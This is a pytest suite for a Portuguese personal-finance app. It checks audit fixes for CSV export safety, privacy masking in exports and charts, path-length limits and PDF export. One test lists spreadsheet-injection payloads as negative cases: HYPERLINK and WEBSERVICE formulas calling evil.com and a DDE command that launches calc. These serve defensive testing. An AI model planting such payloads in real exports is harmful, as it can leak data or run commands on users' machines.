"""Automated verification suite for Audit Batch 33 defects.

Defects covered:
1. BUG-DYN-01: CSV formula & DDE function injection neutralization in _SAFE_HYPHEN_TEXT_REGEX.
2. BUG-DYN-02: Dynamic analysis CSV export privacy masking for payment methods and categories.
3. BUG-DOC-01: Prevention of Windows MAX_PATH (260 chars) overflow in attachment _target_for.
4. BUG-DOC-02: Exclusion of scratch and copying files from protection backups and audit scans.
5. BUG-EXP-01: render_html_to_pdf auto-creates non-existent parent directories before pre-flight check.
6. BUG-REP-01 & BUG-REP-02: PDF export delegation to render_html_to_pdf with pre-wrap CSS.
7. BUG-REP-03: export_txt creates parent directories, handles PermissionError, and masks percentages in privacy mode.
8. BUG-CHART-DONUT-01: DonutChart legend and tooltip percentage masking under privacy mode.
9. BUG-CHART-TREE-01 & BUG-CHART-TREE-02: TreemapChart custom color retention and tile/tooltip privacy masking.
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest
from PySide6.QtGui import QPainter, QPixmap
from PySide6.QtWidgets import QApplication

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from database.engine import FinanceDB
from database.protection import DataProtectionGuard
from database.repo import Repo
from services.documents import DocumentService
from services.export_documents import render_html_to_pdf
from ui.components.charts.donut import DonutChart
from ui.components.charts.treemap import TreemapChart
from ui.core.theme import Theme
from utils.helpers import percent
from utils.output_security import (
    _SAFE_HYPHEN_TEXT_REGEX,
    privacy_export_row,
    spreadsheet_safe_cell,
)


@pytest.fixture(scope="module")
def qapp():
    return QApplication.instance() or QApplication([])


@pytest.fixture
def repo(tmp_path, monkeypatch):
    monkeypatch.delenv("FINANCAS_PESSOAIS_DEMO_DATA", raising=False)
    db = FinanceDB(tmp_path / "batch33_test.sqlite3")
    r = Repo(db)
    yield r
    try:
        db.conn.close()
    except Exception:
        pass


# ============================================================================
# 1. BUG-DYN-01: CSV Formula & DDE Function Injection Neutralization
# ============================================================================

def test_c_dyn_01_safe_hyphen_regex_blocks_functions_and_hyperlinks():
    """_SAFE_HYPHEN_TEXT_REGEX must reject expressions with (), quotes, colons, brackets."""
    dangerous = [
        '+ HYPERLINK("http://evil.com", "click")',
        "- WEBSERVICE('http://evil.com/leak')",
        "+ CMD|' /C calc'!A0",
        "- 10+20",
        "+ 5*5",
        '- alert("xss")',
        "+ [exec(1)]",
        "- calc:run()",
    ]
    for expr in dangerous:
        # Must NOT match safe hyphen regex
        assert not _SAFE_HYPHEN_TEXT_REGEX.match(expr), f"Failed to block dangerous expr: {expr}"
        # spreadsheet_safe_cell must neutralize it with an apostrophe
        safe = spreadsheet_safe_cell(expr)
        assert safe.startswith("'"), f"Dangerous expr was not quoted: {expr} -> {safe}"


def test_c_dyn_01_safe_hyphen_allows_plain_text_notes():
    """_SAFE_HYPHEN_TEXT_REGEX must allow legitimate human notes starting with '-' or '+'."""
    legit_notes = [
        "- Despesa de mercado",
        "+ Ajuste de saldo",
        "- Pagamento de eletricidade",
        "+ Transferência entre contas",
        "- Nota simples sem operadores",
    ]
    for note in legit_notes:
        assert _SAFE_HYPHEN_TEXT_REGEX.match(note), f"Legitimate note was rejected: {note}"
        safe = spreadsheet_safe_cell(note)
        assert not safe.startswith("'"), f"Legitimate note was falsely quoted: {note} -> {safe}"


# ============================================================================
# 2. BUG-DYN-02: Dynamic Analysis CSV Privacy Masking
# ============================================================================

def test_c_dyn_02_privacy_export_row_masks_payment_methods_and_categories():
    """privacy_export_row masks payment methods, categories, and totals when privacy=True."""
    # When grouped by 'Forma de pagamento' (mapped to account)
    row_payment = privacy_export_row(
        ["Multibanco", 125.50, 4],
        ["account", "total", "count"],
        privacy=True,
        mask_categories=True,
    )
    assert row_payment[0] == "Dados ocultos"
    assert row_payment[1] == "••••• €"
    assert row_payment[2] == 4  # count is numeric/safe

    # When grouped by 'Categoria' (mapped to category)
    row_cat = privacy_export_row(
        ["Alimentação", 340.00, 12],
        ["category", "total", "count"],
        privacy=True,
        mask_categories=True,
    )
    assert row_cat[0] == "Dados ocultos"
    assert row_cat[1] == "••••• €"

    # When privacy is False, text remains visible
    row_clear = privacy_export_row(
        ["Alimentação", 340.00, 12],
        ["category", "total", "count"],
        privacy=False,
        mask_categories=False,
    )
    assert row_clear[0] == "Alimentação"
    assert row_clear[1] == 340.00


# ============================================================================
# 3. BUG-DOC-01: Prevention of Windows MAX_PATH (260 Chars) Overflow
# ============================================================================

def test_c_doc_01_target_for_truncates_stem_to_prevent_max_path_overflow(repo, tmp_path):
    """_target_for truncates filename stem so total path never exceeds 240 chars."""
    deep_base = tmp_path / ("sub" * 20)
    deep_base.mkdir(parents=True, exist_ok=True)
    doc_service = DocumentService(repo, attachments_directory=deep_base)

    very_long_name = "fatura_muito_longa_com_muitos_detalhes_e_caracteres_que_poderiam_estourar_o_caminho_maximo_do_windows_sistema_operativo.pdf"
    fake_orig = Path(very_long_name)

    target = doc_service._target_for(transaction_id=99999, original=fake_orig)

    # Check total length including temporary .copying suffix
    temp_path = target.with_name(f".{target.name}.copying")
    assert len(str(temp_path.resolve())) <= 250
    # Must preserve the extension
    assert target.suffix == ".pdf"


# ============================================================================
# 4. BUG-DOC-02: Exclusion of Scratch Files from Protection and Audits
# ============================================================================

def test_c_doc_02_protection_and_audit_excludes_scratch_and_copying_files(repo, tmp_path):
    """Temporary scratch files (.copying, .tmp, .* dotfiles) are excluded from backups and audits."""
    attach_dir = tmp_path / "anexos"
    tx_folder = attach_dir / "101"
    tx_folder.mkdir(parents=True, exist_ok=True)

    real_file = tx_folder / "fatura.pdf"
    real_file.write_bytes(b"real content")

    copying_file = tx_folder / ".fatura.pdf.copying"
    copying_file.write_bytes(b"partial copying")

    tmp_file = tx_folder / "scratch.tmp"
    tmp_file.write_bytes(b"temporary scratch")

    doc_service = DocumentService(repo, attachments_directory=attach_dir)
    audit = doc_service.audit_storage()

    orphan_basenames = [Path(p).name for p in audit["orphan_files"]]
    assert ".fatura.pdf.copying" not in orphan_basenames
    assert "scratch.tmp" not in orphan_basenames

    collected = DataProtectionGuard._files_under(
        attach_dir, scope="anexos", archive_root="anexos"
    )
    collected_names = [p.source.name for p in collected]
    assert "fatura.pdf" in collected_names
    assert ".fatura.pdf.copying" not in collected_names
    assert "scratch.tmp" not in collected_names


# ============================================================================
# 5. BUG-EXP-01: render_html_to_pdf Auto-Creates Missing Parent Directories
# ============================================================================

def test_c_exp_01_render_html_to_pdf_creates_missing_parent_directories(tmp_path, qapp):
    """render_html_to_pdf creates missing nested directories before pre-flight open."""
    nested_output = tmp_path / "nested_dir" / "deeper" / "output.pdf"
    assert not nested_output.parent.exists()

    html = "<h1>Relatório de Teste</h1><p>Conteúdo de teste</p>"
    result_path = render_html_to_pdf(html, nested_output)

    assert Path(result_path).exists()
    assert Path(result_path).parent.exists()
    assert Path(result_path).stat().st_size > 0


# ============================================================================
# 6. BUG-REP-01 & BUG-REP-02: Reports PDF Export Delegation & Pre-Wrap
# ============================================================================

def test_c_rep_01_reports_source_delegates_to_render_html_to_pdf():
    """ReportsPage methods must delegate PDF rendering to render_html_to_pdf."""
    source = (ROOT / "ui" / "pages" / "reports.py").read_text(encoding="utf-8")
    assert "render_html_to_pdf(" in source
    assert "from PySide6.QtPrintSupport import QPrinter" not in source


def test_c_rep_02_monthly_review_html_has_pre_wrap():
    """Monthly review HTML payload must use white-space: pre-wrap and word-wrap."""
    source = (ROOT / "ui" / "pages" / "reports.py").read_text(encoding="utf-8")
    assert "white-space:pre-wrap" in source
    assert "word-wrap:break-word" in source


# ============================================================================
# 7. BUG-REP-03: export_txt Parent Dir, Permission Handling & Privacy Masking
# ============================================================================

def test_c_rep_03_helpers_percent_supports_privacy():
    """utils.helpers.percent masks to '•••%' when privacy=True."""
    assert percent(15.4, privacy=False) == "15,4%"
    assert percent(0.0, privacy=False) == "0,0%"
    assert percent(15.45, privacy=True) == "•••%"
    assert percent(0.0, privacy=True) == "•••%"


def test_c_rep_03_export_txt_source_contract():
    """export_txt creates parents, handles PermissionError, and masks savings rate."""
    source = (ROOT / "ui" / "pages" / "reports.py").read_text(encoding="utf-8")
    assert "rate_str = \"•••%\" if privacy else f\"{sr:.1f}%\"" in source
    assert "except PermissionError" in source
    assert "Path(path).parent.mkdir(parents=True, exist_ok=True)" in source


# ============================================================================
# 8. BUG-CHART-DONUT-01: DonutChart Privacy Masking
# ============================================================================

def test_c_chart_donut_01_masks_percentages_in_legend_and_tooltip_under_privacy(qapp):
    """DonutChart masks percentage values in legend and tooltip when theme.privacy is True."""
    theme = Theme()
    theme.privacy = True
    chart = DonutChart(lambda: theme)
    chart.resize(320, 320)
    chart.set_data([
        ("Alimentação", 300.0, "#FF5555"),
        ("Transportes", 150.0, "#55FF55"),
        ("Lazer", 50.0, "#5555FF"),
    ])
    chart.show()
    qapp.processEvents()

    pix = QPixmap(320, 320)
    painter = QPainter(pix)
    total = sum(v for _, v, _ in chart.data)
    chart._draw_legend(painter, chart.rect(), total)
    painter.end()

    source = (ROOT / "ui" / "components" / "charts" / "donut.py").read_text(encoding="utf-8")
    assert "percent(value / total * 100 if total else 0, theme.privacy)" in source
    assert '"•••%"' in source
    assert 'comparison = f"{self.comparison_label}: {eur(comparison_value, True)} (•••%)"' in source
    chart.close()


# ============================================================================
# 9. BUG-CHART-TREE-01 & BUG-CHART-TREE-02: TreemapChart Colors & Privacy
# ============================================================================

def test_c_chart_tree_01_honors_custom_colors(qapp):
    """TreemapChart preserves custom colors passed in set_data."""
    chart = TreemapChart(lambda: Theme())
    chart.set_data([
        ("Saúde", 200.0, "#123456"),
        ("Educação", 100.0, "#654321"),
    ])
    assert chart.category_colors["Saúde"] == "#123456"
    assert chart.category_colors["Educação"] == "#654321"


def test_c_chart_tree_02_masks_impact_percentages_under_privacy(qapp):
    """TreemapChart masks Impacto percentages under privacy mode in tiles and tooltips."""
    source = (ROOT / "ui" / "components" / "charts" / "treemap.py").read_text(encoding="utf-8")
    assert '"Impacto •••%"' in source
    assert 'pct_text = "•••%" if self.theme_provider().privacy' in source
    assert 'impact_str = "Impacto •••%" if theme.privacy' in source
